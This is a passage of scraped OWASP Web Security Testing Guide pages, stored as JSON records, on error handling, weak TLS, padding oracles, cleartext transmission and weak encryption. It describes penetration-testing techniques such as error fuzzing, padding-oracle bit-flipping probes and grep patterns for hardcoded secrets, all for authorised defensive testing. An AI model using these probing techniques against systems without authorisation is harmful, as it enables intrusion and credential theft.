must handle and parse HTTP requests, and for that a web server is always part of the stack. Some of the most famous web servers are Nginx, Apache, and IIS.\n\nWeb servers have known error messages and formats. If one is not familiar with how they look, searching online for them would provide examples. Another way would be to look into their documentation, or simply setup a server locally and discover the errors by going through the pages that the web server uses.\n\nIn order to trigger error messages, a tester must:\n\n- Search for random files and folders that will not be found (404s).\n- Try to request folders that exist and see the server behavior (403s, blank page, or directory listing).\n- Try sending a request that breaks the [HTTP RFC](https://tools.ietf.org/html/rfc7231). One example would be to send a very large path, break the headers format, or change the HTTP version.\n    - Even if errors are handled on the application level, breaking the HTTP RFC may make the integrated web server show itself since it has to handle the request, and developers forget to override these errors.\n\n### Applications\n\nApplications are the most susceptible to let out a wide variety of error messages, which include: stack traces, memory dumps, mishandled exceptions, and generic errors. This happens due to the fact that applications are custom built most of the time and the developers need to observe and handle all possible error cases (or have a global error catching mechanism), and these errors can appear from integrations with other services.\n\nIn order to make an application throw these errors, a tester must:\n\n1. Identify possible input points where the application is expecting data.\n2. Analyse the expected input type (strings, integers, JSON, XML, etc.).\n3. Fuzz every input point based on the previous steps to have a more focused test scenario.\n   - Fuzzing every input with all possible injections is not the best solution unless you have unlimited testing time and the application can handle that much input.\n   - If fuzzing isn't an option, handpick viable inputs that have the highest chance to break a certain parser (*e.g.* a closing bracket for a JSON body, a large text where only a couple of characters are expected, CLRF injection with parameters that might be parsed by servers and input validation controls, special characters that aren't applicable for filenames, etc.).\n   - Fuzzing with jargon data should be ran for every type as sometimes the interpreters will break outside of the developer's exception handling.\n4. Understand the service responding with the error message and try to make a more refined fuzz list to bring out more information or error details from that service (it could be a database, a standalone service, etc.).\n\nError messages are sometimes the main weakness in mapping out systems, especially under a microservice architecture. If services are not properly set to handle errors in a generic and uniform manner, error messages would let a tester identify which service handles which requests, and allows for a more focused attack per service.\n\n> The tester needs to keep a vigilant eye for the response type. Sometimes errors are returned as success with an error body, hide the error in a 302, or simply by having a custom way of representing that error.\n\n## Remediation\n\nFor remediation, check out the [Proactive Controls C10](https://owasp.org/www-project-proactive-controls/v3/en/c10-errors-exceptions) and the [Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html).\n\n## Playgrounds\n\n- [Juice Shop - Error Handling](https://pwning.owasp-juice.shop/companion-guide/latest/part2/security-misconfiguration.html#provoke-an-error-that-is-neither-very-gracefully-nor-consistently-handled)\n\n## References\n\n- [WSTG: Appendix C - Fuzzing](../../6-Appendix/C-Fuzzing.md)\n- [Proactive Controls C10: Handle All Errors and Exceptions](https://owasp.org/www-project-proactive-controls/v3/en/c10-errors-exceptions)\n- [ASVS v4.1 v7.4: Error handling](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md#v74-error-handling)\n- [CWE 728 - Improper Error Handling](https://cwe.mitre.org/data/definitions/728.html)\n- [Cheat Sheet Series: Error Handling](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:54.995566"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security.md", "content": "# Testing for Weak Transport Layer Security\n\n|ID          |\n|------------|\n|WSTG-CRYP-01|\n\n## Summary\n\nWhen information is sent between the client and the server, it must be encrypted and protected in order to prevent an attacker from being able to read or modify it. This is most commonly done using HTTPS, which uses the [Transport Layer Security (TLS)](https://en.wikipedia.org/wiki/Transport_Layer_Security) protocol, a replacement for the older Secure Socket Layer (SSL) protocol. TLS also provides a way for the server to demonstrate to the client that they have connected to the correct server, by presenting a trusted digital certificate.\n\nOver the years there have been a large number of cryptographic weaknesses identified in the SSL and TLS protocols, as well as in the ciphers that they use. Additionally, many of the implementations of these protocols have also had serious vulnerabilities. As such, it is important to test that sites are not only implementing TLS, but that they are doing so in a secure manner.\n\n## Test Objectives\n\n- Validate the service configuration.\n- Review the digital certificate's cryptographic strength and validity.\n- Ensure that the TLS security is not bypassable and is properly implemented across the application.\n\n## How to Test\n\nTransport layer security related issues can be broadly split into the following areas:\n\n### Server Configuration\n\nThere are a large number of protocol versions, ciphers, and extensions supported by TLS. Many of these are considered to be legacy, and have cryptographic weaknesses, such as those listed below. Note that new weaknesses are likely to be identified over time, so this list may be incomplete.\n\n- [SSLv2 (DROWN)](https://drownattack.com/)\n- [SSLv3 (POODLE)](https://en.wikipedia.org/wiki/POODLE)\n- [TLSv1.0 (BEAST)](https://www.acunetix.com/blog/web-security-zone/what-is-beast-attack/)\n- [TLSv1.1 (Deprecated by RFC 8996)](https://tools.ietf.org/html/rfc8996)\n- [EXPORT ciphers suites (FREAK)](https://en.wikipedia.org/wiki/FREAK)\n- NULL ciphers ([they only provide authentication](https://tools.ietf.org/html/rfc4785)).\n- Anonymous ciphers (these may be supported on SMTP servers, as discussed in [RFC 7672](https://tools.ietf.org/html/rfc7672#section-8.2))\n- [RC4 ciphers (NOMORE)](https://www.rc4nomore.com/)\n- CBC mode ciphers (BEAST, [Lucky 13](https://en.wikipedia.org/wiki/Lucky_Thirteen_attack))\n- [TLS compression (CRIME)](https://en.wikipedia.org/wiki/CRIME)\n- [Weak DHE keys (LOGJAM)](https://weakdh.org/)\n\nThe [Mozilla Server-Side TLS Guide](https://wiki.mozilla.org/Security/Server_Side_TLS) details the protocols and ciphers that are currently recommended.\n\n#### Exploitability\n\nIt should be emphasised that while many of these attacks have been demonstrated in a lab environment, they are not generally considered practical to exploit in the real world, as they require a (usually active) MitM attack, and significant resources. As such, they are unlikely to be exploited by anyone other than nation states.\n\n### Digital Certificates\n\n#### Cryptographic Weaknesses\n\nFrom a cryptographic perspective, there are two main areas that need to be reviewed on a digital certificate:\n\n- The key strength should be *at least* 2048 bits.\n- The signature algorithm should be *at least* SHA-256. Legacy algorithms such as MD5 and SHA-1 should not be used.\n\n#### Validity\n\nAs well as being cryptographically secure, the certificate must also be considered valid (or trusted). This means that it must:\n\n- Be within the defined validity period.\n    - Any certificates issued after 1st September 2020 must not have a maximum lifespan of more than [398 days](https://blog.mozilla.org/security/2020/07/09/reducing-tls-certificate-lifespans-to-398-days/).\n- Be signed by a trusted certificate authority (CA).\n    - This should either be a trusted public CA for externally facing applications, or an internal CA for internal applications.\n    - Don't flag internal applications as having untrusted certificates just because *your* system doesn't trust the CA.\n- Have a Subject Alternate Name (SAN) that matches the hostname of the system.\n    - The Common Name (CN) field is ignored by modern browsers, which only look at the SAN.\n    - Make sure that you're accessing the system with the correct name (for example, if you access the host by IP then any certificate will be appear untrusted).\n\nSome certificates may be issued for wildcard domains (such as `*.example.org`), meaning that they can be valid for multiple subdomains. Although convenient, there are a number of security concerns around this that should be considered. These are discussed in the [OWASP Transport Layer Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#carefully-consider-the-use-of-wildcard-certificates).\n\nCertificates can also leak information about internal systems or domain names in the Issuer and SAN fields, which can be useful when trying to build up a picture of the internal network or conduct social engineering activities.\n\n### Implementation Vulnerabilities\n\nOver the years there have been vulnerabilities in the various TLS implementations. There are too many to list here, but some of the key examples are:\n\n- [Debian OpenSSL Predictable Random Number Generator](https://www.debian.org/security/2008/dsa-1571) (CVE-2008-0166)\n- [OpenSSL Insecure Renegotiation](https://www.openssl.org/news/secadv/20091111.txt) (CVE-2009-3555)\n- [OpenSSL Heartbleed](https://heartbleed.com) (CVE-2014-0160)\n- [F5 TLS POODLE](https://support.f5.com/csp/article/K15882) (CVE-2014-8730)\n- [Microsoft Schannel Denial of Service](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-066) (MS14-066 / CVE-2014-6321)\n\n### Application Vulnerabilities\n\nAs well as the underlying TLS configuration being securely configured, the application also needs to use it in a secure way. Some of these points are addressed elsewhere in this guide:\n\n- [Not sending sensitive data over unencrypted channels (WSTG-CRYP-03)](03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md)\n- [Setting the HTTP Strict-Transport-Security header (WSTG-CONF-07)](../02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security.md)\n- [Setting the Secure flag on cookies (WSTG-SESS-02)](../06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md)\n\n#### Mixed Active Content\n\nMixed active content is when active resources (such as scripts to CSS) are loaded over unencrypted HTTP and included into a secure (HTTPS) page. This is dangerous because it would allow an attacker to modify these files (as they are sent unencrypted), which could allow them to execute arbitrary code (JavaScript or CSS) in the page. Passive content (such as images) loaded over an insecure connection can also leak information or allow an attacker to deface the page, although it is less likely to lead to a full compromise.\n\n> Note: modern browsers will block active content being loaded from insecure sources into secure pages.\n\n#### Redirecting from HTTP to HTTPS\n\nMany sites will accept connections over unencrypted HTTP, and then immediately redirect the user to the secure (HTTPS) version of the site with a `301 Moved Permanently` redirect. The HTTPS version of the site then sets the `Strict-Transport-Security` header to instruct the browser to always use HTTPS in future.\n\nHowever, if an attacker is able to intercept this initial request, they could redirect the user to a malicious site, or use a tool such as [sslstrip](https://github.com/moxie0/sslstrip) to intercept subsequent requests.\n\nIn order to defend against this type of attack, the site must be added to the [preload list](https://hstspreload.org).\n\n## Automated Testing\n\nThere are a large number of scanning tools that can be used to identify weaknesses in the SSL/TLS configuration of a service, including both dedicated tools and general purpose vulnerability scanners. Some of the more popular ones are:\n\n- [Nmap](https://nmap.org) (various scripts)\n- [OWASP O-Saft](https://owasp.org/www-project-o-saft/)\n- [sslscan](https://github.com/rbsec/sslscan)\n- [sslyze](https://github.com/nabla-c0d3/sslyze)\n- [SSL Labs](https://www.ssllabs.com/ssltest/)\n- [testssl.sh](https://github.com/drwetter/testssl.sh)\n\n### Manual Testing\n\nIt is also possible to carry out most checks manually, using command-line looks such as `openssl s_client` or `gnutls-cli` to connect with specific protocols, ciphers or options.\n\nWhen testing like this, be aware that the version of OpenSSL or GnuTLS shipped with most modern systems may will not support some outdated and insecure protocols such as SSLv2 or EXPORT ciphers. Make sure that your version supports the outdated versions before using it for testing, or you'll end up with false negatives.\n\nIt can also be possible to performed limited testing using a web browser, as modern browsers will provide details of the protocols and ciphers that are being used in their developer tools. They also provide an easy way to test whether a certificate is considered trusted, by browsing to the service and seeing if you are presented with a certificate warning.\n\n## References\n\n- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n- [Mozilla Server-Side TLS Guide](https://wiki.mozilla.org/Security/Server_Side_TLS)\n- [CWE-1428: Reliance on HTTP instead of HTTPS](https://cwe.mitre.org/data/definitions/1428.html)\n", "timestamp": "2025-10-24T11:39:55.428017"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle.md", "content": "# Testing for Padding Oracle\n\n|ID          |\n|------------|\n|WSTG-CRYP-02|\n\n## Summary\n\nA padding oracle is a function of an application which decrypts encrypted data provided by the client, e.g. internal session state stored on the client, and leaks the state of the validity of the padding after decryption. The existence of a padding oracle allows an attacker to decrypt encrypted data and encrypt arbitrary data without knowledge of the key used for these cryptographic operations. This can lead to leakage of sensitive data or to privilege escalation vulnerabilities, if integrity of the encrypted data is assumed by the application.\n\nBlock ciphers encrypt data only in blocks of certain sizes. Block sizes used by common ciphers are 8 and 16 bytes. Data where the size doesn't match a multiple of the block size of the used cipher has to be padded in a specific manner so the decryptor is able to strip the padding. A commonly used padding scheme is PKCS#7. It fills the remaining bytes with the value of the padding length.\n\n### Example 1\n\nIf the padding has the length of 5 bytes, the byte value `0x05` is repeated five times after the plain text.\n\nAn error condition is present if the padding doesn't match the syntax of the used padding scheme. A padding oracle is present if an application leaks this specific padding error condition for encrypted data provided by the client. This can happen by exposing exceptions (e.g. `BadPaddingException` in Java) directly, by subtle differences in the responses sent to the client or by another side-channel like timing behavior.\n\nCertain modes of operation of cryptography allow bit-flipping attacks, where flipping of a bit in the cipher text causes that the bit is also flipped in the plain text. Flipping a bit in the n-th block of CBC encrypted data causes that the same bit in the (n+1)-th block is flipped in the decrypted data. The n-th block of the decrypted cipher text is garbaged by this manipulation.\n\nThe padding oracle attack enables an attacker to decrypt encrypted data without knowledge of the encryption key and used cipher by sending skillful manipulated cipher texts to the padding oracle and observing of the results returned by it. This causes loss of confidentiality of the encrypted data. E.g. in the case of session data stored on the client-side the attacker can gain information about the internal state and structure of the application.\n\nA padding oracle attack also enables an attacker to encrypt arbitrary plain texts without knowledge of the used key and cipher. If the application assumes that integrity and authenticity of the decrypted data is given, an attacker could be able to manipulate internal session state and possibly gain higher privileges.\n\n## Test Objectives\n\n- Identify encrypted messages that rely on padding.\n- Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.\n\n## How to Test\n\n### Black-Box Testing\n\nFirst the possible input points for padding oracles must be identified. Generally the following conditions must be met:\n\n1. The data is encrypted. Good candidates are values which appear to be random.\n2. A block cipher is used. The length of the decoded (Base64 is used often) cipher text is a multiple of common cipher block sizes like 8 or 16 bytes. Different cipher texts (e.g. gathered by different sessions or manipulation of session state) share a common divisor in the length.\n\n#### Example 2\n\n`Dg6W8OiWMIdVokIDH15T/A==` results after base64 decoding in `0e 0e 96 f0 e8 96 30 87 55 a2 42 03 1f 5e 53 fc`. This seems to be random and 16 byte long.\n\nIf such an input value candidate is identified, the behavior of the application to bit-wise tampering of the encrypted value should be verified. Normally this base64 encoded value will include the initialization vector (IV) prepended to the cipher text. Given a plaintext *`p`* and a cipher with a block size *`n`*, the number of blocks will be *`b = ceil( length(p) / n)`*. The length of the encrypted string will be *`y=(b+1)*n`* due to the initialization vector. To verify the presence of the oracle, decode the string, flip the last bit of the second-to-last block *`b-1`* (the least significant bit of the byte at *`y-n-1`*), re-encode and send. Next, decode the original string, flip the last bit of the block *`b-2`* (the least significant bit of the byte at *`y-2*n-1`*), re-encode and send.\n\nIf it is known that the encrypted string is a single block (the IV is stored on the server or the application is using a bad practice hardcoded IV), several bit flips must be performed in turn. An alternative approach could be to prepend a random block, and flip bits in order to make the last byte of the added block take all possible values (0 to 255).\n\nThe tests and the base value should at least cause three different states while and after decryption:\n\n- Cipher text gets decrypted, resulting data is correct.\n- Cipher text gets decrypted, resulting data is garbled and causes some exception or error handling in the application logic.\n- Cipher text decryption fails due to padding errors.\n\nCompare the responses carefully. Search especially for exceptions and messages which state that something is wrong with the padding. If such messages appear, the application contains a padding oracle. If the three different states described above are observable implicitly (different error messages, timing side-channels), there is a high probability that there is a padding oracle present at this point. Try to perform the padding oracle attack to ensure this.\n\n##### Example 3\n\n- ASP.NET throws `System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed.` if padding of a decrypted cipher text is broken.\n- In Java a `javax.crypto.BadPaddingException` is thrown in this case.\n- Decryption errors or similar can be possible padding oracles.\n\n> A secure implementation will check for integrity and cause only two responses: `ok` and `failed`. There are no side channels which can be used to determine internal error states.\n\n### Gray-Box Testing\n\nVerify that all places where encrypted data from the client, that should only be known by the server, is decrypted. The following conditions should be met by such code:\n\n1. The integrity of the cipher text should be verified by a secure mechanism, like HMAC or authenticated cipher operation modes like GCM or CCM.\n2. All error states while decryption and further processing are handled uniformly.\n\n### Example 4\n\n[Visualization of the decryption process](https://erlend.oftedal.no/blog/poet/)\n\n## Tools\n\n- [Bletchley](https://code.blindspotsecurity.com/trac/bletchley)\n- [PadBuster](https://github.com/GDSSecurity/PadBuster)\n- [Poracle](https://github.com/iagox86/Poracle)\n- [python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)\n\n## References\n\n- [Wikipedia - Padding Oracle Attack](https://en.wikipedia.org/wiki/Padding_oracle_attack)\n- [Juliano Rizzo, Thai Duong, \"Practical Padding Oracle Attacks\"](https://www.usenix.org/event/woot10/tech/full_papers/Rizzo.pdf)\n", "timestamp": "2025-10-24T11:39:55.527506"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md", "content": "# Testing for Sensitive Information Sent via Unencrypted Channels\n\n|ID          |\n|------------|\n|WSTG-CRYP-03|\n\n## Summary\n\nSensitive data must be protected when it is transmitted through the network. If data is transmitted over HTTPS or encrypted in another way the protection mechanism must not have limitations or vulnerabilities, as explained in the broader article [Testing for Weak Transport Layer Security](01-Testing_for_Weak_Transport_Layer_Security.md) and in other OWASP documentation:\n\n- [OWASP Top 10 2017 A3-Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure).\n- [OWASP ASVS - Verification V9](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x17-V9-Communications.md).\n- [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html).\n\nAs a rule of thumb if data must be protected when it is stored, this data must also be protected during transmission. Some examples for sensitive data are:\n\n- Information used in authentication (e.g. Credentials, PINs, Session identifiers, Tokens, Cookies…)\n- Information protected by laws, regulations or specific organizational policy (e.g. Credit Cards, Customers data)\n\nIf the application transmits sensitive information via unencrypted channels - e.g. HTTP - it is considered a security risk. Attackers can take over accounts by [sniffing network traffic](https://owasp.org/www-community/attacks/Manipulator-in-the-middle_attack). Some examples are Basic authentication which sends authentication credentials in plain-text over HTTP, form based authentication credentials sent via HTTP, or plain-text transmission of any other information considered sensitive due to regulations, laws, organizational policy or application business logic.\n\nExamples for Personal Identifying Information (PII) are:\n\n- Social security numbers\n- Bank account numbers\n- Passport information\n- Healthcare related information\n- Medical insurance information\n- Student information\n- Credit and debit card numbers\n- Driver's license and State ID information\n\n## Test Objectives\n\n- Identify sensitive information transmitted through the various channels.\n- Assess the privacy and security of the channels used.\n\n## How to Test\n\nVarious types of information that must be protected, could be transmitted by the application in clear text. To check if this information is transmitted over HTTP instead of HTTPS, capture traffic between a client and web application server that needs credentials. For any message containing sensitive data, verify the exchange occurred using HTTPS. See more information about insecure transmission of credentials [OWASP Top 10 2017 A3-Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) or [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html).\n\n### Example 1: Basic Authentication over HTTP\n\nA typical example is the usage of Basic Authentication over HTTP. When using Basic Authentication, user credentials are encoded rather than encrypted, and are sent as HTTP headers. In the example below the tester uses [curl](https://curl.haxx.se/) to test for this issue. Note how the application uses Basic authentication, and HTTP rather than HTTPS.\n\n```bash\n$ curl -kis http://example.com/restricted/\nHTTP/1.1 401 Authorization Required\nDate: Fri, 01 Aug 2013 00:00:00 GMT\nWWW-Authenticate: Basic realm=\"Restricted Area\"\nAccept-Ranges: bytes Vary:\nAccept-Encoding Content-Length: 162\nContent-Type: text/html\n\n<html><head><title>401 Authorization Required</title></head>\n<body bgcolor=white> <h1>401 Authorization Required</h1>  Invalid login credentials!  </body></html>\n```\n\n### Example 2: Form-Based Authentication Performed over HTTP\n\nAnother typical example is authentication forms which transmit user authentication credentials over HTTP. In the example below one can see HTTP being used in the `action` attribute of the form. It is also possible to see this issue by examining the HTTP traffic with an interception proxy.\n\n```html\n<form action=\"http://example.com/login\">\n    <label for=\"username\">User:</label> <input type=\"text\" id=\"username\" name=\"username\" value=\"\"/><br />\n    <label for=\"password\">Password:</label> <input type=\"password\" id=\"password\" name=\"password\" value=\"\"/>\n    <input type=\"submit\" value=\"Login\"/>\n</form>\n```\n\n### Example 3: Cookie Containing Session ID Sent over HTTP\n\nThe Session ID Cookie must be transmitted over protected channels. If the cookie does not have the [secure flag](../06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md) set, it is permitted for the application to transmit it unencrypted. Note below the setting of the cookie is done without the Secure flag, and the entire log in process is performed in HTTP and not HTTPS.\n\n```http\nhttps://secure.example.com/login\n\nPOST /login HTTP/1.1\nHost: secure.example.com\n[...]\nReferer: https://secure.example.com/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 188\n\nHTTP/1.1 302 Found\nDate: Tue, 03 Dec 2013 21:18:55 GMT\nServer: Apache\nSet-Cookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA; expires=Fri, 01-Jan-2014 00:00:00 GMT; path=/; domain=example.com; httponly\nLocation: private/\nContent-Length: 0\nContent-Type: text/html\n```\n\n```http\nhttp://example.com/private\n\nGET /private HTTP/1.1\nHost: example.com\n[...]\nReferer: https://secure.example.com/login\nCookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA;\n\nHTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\nContent-Length: 730\nDate: Tue, 25 Dec 2013 00:00:00 GMT\n```\n\n### Example 4: Password Reset, Change Password or Other Account Manipulation over HTTP\n\nIf the web application has features that allow a user to change an account or call a different service with credentials, verify all of those interactions use HTTPS. The interactions to test include the following:\n\n- Forms that allow users to handle a forgotten password or other credentials\n- Forms that allow users to edit credentials\n- Forms that require the user to authenticate with another provider (for example, payment processing)\n\n### Example 5: Testing Password Sensitive Information in Source Code or Logs\n\nUse one of the following techniques to search for sensitive information.\n\nChecking if password or encryption key is hardcoded in the source code or configuration files.\n\n`grep -r –E \"Pass | password | pwd |user | guest| admin | encry | key | decrypt | sharekey \" ./PathToSearch/`\n\nChecking if logs or source code may contain phone number, email address, ID or any other PII. Change the regular expression based on the format of the PII.\n\n`grep -r \" {2\\}[0-9]\\{6\\} \"  ./PathToSearch/`\n\n## Remediation\n\nUse HTTPS for the whole web site and redirect any HTTP requests to HTTPS.\n\n## Tools\n\n- [curl](https://curl.haxx.se/)\n- [grep](https://man7.org/linux/man-pages/man1/egrep.1.html)\n- [Wireshark](https://www.wireshark.org/)\n- [TCPDUMP](https://www.tcpdump.org/)\n\n## References\n\n- [OWASP Insecure Transport](https://owasp.org/www-community/vulnerabilities/Insecure_Transport)\n- [OWASP HTTP Strict Transport Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)\n- [Let's Encrypt](https://letsencrypt.org)\n", "timestamp": "2025-10-24T11:39:55.614604"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md", "content": "# Testing for Weak Encryption\n\n|ID          |\n|------------|\n|WSTG-CRYP-04|\n\n## Summary\n\nIncorrect uses of encryption algorithms may result in sensitive data exposure, key leakage, broken authentication, insecure session, and spoofing attacks. There are some encryption or hash algorithms known to be weak and are not suggested for use such as MD5 and RC4.\n\nIn addition to the right choices of secure encryption or hash algorithms, the right uses of parameters also matter for the security level. For example, ECB (Electronic Code Book) mode generally should not be used.\n\n## Test Objectives\n\n- Provide a guideline for the identification weak encryption or hashing uses and implementations.\n\n## How to Test\n\n### Basic Security Checklist\n\n- When using AES128 or AES256, the IV (Initialization Vector) must be random and unpredictable. Refer to [FIPS 140-2, Security Requirements for Cryptographic Modules](https://csrc.nist.gov/publications/detail/fips/140/2/final), section 4.9.1. random number generator tests. For example, in Java, `java.util.Random` is considered a weak random number generator. `java.security.SecureRandom` should be used instead of `java.util.Random`.\n- For asymmetric encryption, use Elliptic Curve Cryptography (ECC) with a secure curve like `Curve25519` preferred.\n    - If ECC can't be used then use RSA encryption with a minimum 2048bit key.\n- When uses of RSA in signature, PSS padding is recommended.\n- Weak hash/encryption algorithms should not be used such MD5, RC4, DES, Blowfish, SHA1. 1024-bit RSA or DSA, 160-bit ECDSA (elliptic curves), 80/112-bit 2TDEA (two key triple DES)\n- Minimum Key length requirements:\n\n```text\nKey exchange: Diffie–Hellman key exchange with minimum 2048 bits\nMessage Integrity: HMAC-SHA2\nMessage Hash: SHA2 256 bits\nAsymmetric encryption: RSA 2048 bits\nSymmetric-key algorithm: AES 128 bits\nPassword Hashing: PBKDF2, Scrypt, Bcrypt\nECDH, ECDSA: 256 bits\n```\n\n- Uses of SSH, CBC mode should not be used.\n- When symmetric encryption algorithm is used, ECB (Electronic Code Book) mode should not be used.\n- When PBKDF2 is used to hash password, the parameter of iteration is recommended to be over 10000. [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html#sec5) also suggests at least 10,000 iterations of the hash function. In addition, MD5 hash function is forbidden to be used with PBKDF2 such as PBKDF2WithHmacMD5.\n\n### Source Code Review\n\n- Search for the following keywords to identify use of weak algorithms: `MD4, MD5, RC4, RC2, DES, Blowfish, SHA-1, ECB`\n\n- For Java implementations, the following API is related to encryption. Review the parameters of the encryption implementation. For example,\n\n```java\nSecretKeyFactory(SecretKeyFactorySpi keyFacSpi, Provider provider, String algorithm)\nSecretKeySpec(byte[] key, int offset, int len, String algorithm)\nCipher c = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n```\n\n- For RSA encryption, the following padding modes are suggested.\n\n```text\nRSA/ECB/OAEPWithSHA-1AndMGF1Padding (2048)\nRSA/ECB/OAEPWithSHA-256AndMGF1Padding (2048)\n```\n\n- Search for `ECB`, it's not allowed to be used in padding.\n- Review if different IV (initial Vector) is used.\n\n```java\n// Use a different IV value for every encryption\nbyte[] newIv = ...;\ns = new GCMParameterSpec(s.getTLen(), newIv);\ncipher.init(..., s);\n...\n```\n\n- Search for `IvParameterSpec`, check if the IV value is generated differently and randomly.\n\n```java\n IvParameterSpec iv = new IvParameterSpec(randBytes);\n SecretKeySpec skey = new SecretKeySpec(key.getBytes(), \"AES\");\n Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n cipher.init(Cipher.ENCRYPT_MODE, skey, iv);\n```\n\n- In Java, search for MessageDigest to check if weak hash algorithm (MD5 or CRC) is used. For example:\n\n`MessageDigest md5 = MessageDigest.getInstance(\"MD5\");`\n\n- For signature, SHA1 and MD5 should not be used. For example:\n\n`Signature sig = Signature.getInstance(\"SHA1withRSA\");`\n\n- Search for `PBKDF2`. To generate the hash value of password, `PBKDF2` is suggested to be used. Review the parameters to generate the `PBKDF2` has value.\n\nThe iterations should be over **10000**, and the **salt** value should be generated as **random value**.\n\n```java\nprivate static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes)\n    throws NoSuchAlgorithmException, InvalidKeySpecException\n  {\n       PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8);\n       SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);\n       return skf.generateSecret(spec).getEncoded();\n   }\n```\n\n- Hard-coded sensitive information:\n\n```text\nUser related keywords: name, root, su, sudo, admin, superuser, login, username, uid\nKey related keywords: public key, AK, SK, secret key, private key, passwd, password, pwd, share key, shared key, cryto, base64\nOther common sensitive keywords: sysadmin, root, privilege, pass, key, code, master, admin, uname, session, token, Oauth, privatekey, shared secret\n```\n\n## Tools\n\n- Vulnerability scanners such as Nessus, NMAP (scripts), or OpenVAS can scan for use or acceptance of weak encryption against protocol such as SNMP, TLS, SSH, SMTP, etc.\n- Use static code analysis tool to do source code review such as klocwork, Fortify, Coverity, CheckMark for the following cases.\n\n```text\nCWE-261: Weak Cryptography for Passwords\nCWE-323: Reusing a Nonce, Key Pair in Encryption\nCWE-326: Inadequate Encryption Strength\nCWE-327: Use of a Broken or Risky Cryptographic Algorithm\nCWE-328: Reversible One-Way Hash\nCWE-329: Not Using a Random IV with CBC Mode\nCWE-330: Use of Insufficiently Random Values\nCWE-347: Improper Verification of Cryptographic Signature\nCWE-354: Improper Validation of Integrity Check Value\nCWE-547: Use of Hard-coded, Security-relevant Constants\nCWE-780: Use of RSA Algorithm without OAEP\n```\n\n## References\n\n- [NIST FIPS Standards](https://csrc.nist.gov/publications/fips)\n- [Wikipedia: Initialization Vector](https://en.wikipedia.org/wiki/Initialization_vector)\n- [Secure Coding - Generating Strong Random Numbers](https://www.securecoding.cert.org/confluence/display/java/MSC02-J.+Generate+strong+random+numbers)\n- [Optimal Asymmetric Encryption Padding](https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding)\n- [Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)\n- [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)\n- [Secure Coding - Do not use insecure or weak cryptographic algorithms](https://www.securecoding.cert.org/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms)\n- [Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness)\n- [Insufficient Entropy](https://owasp.org/www-community/vulnerabilities/Insufficient_Entropy)\n- [Insufficient Session-ID Length](https://owasp.org/www-community/vulnerabilities/Insufficient_Session-ID_Length)\n- [Using a broken or risky cryptographic algorithm](https://owasp.org/www-community/vulnerabilities/Using_a_broken_or_risky_cryptographic_algorithm)\n- [Javax.crypto.cipher API](https://docs.oracle.com/javase/8/docs/api/javax/crypto/Cipher.html)\n- ISO 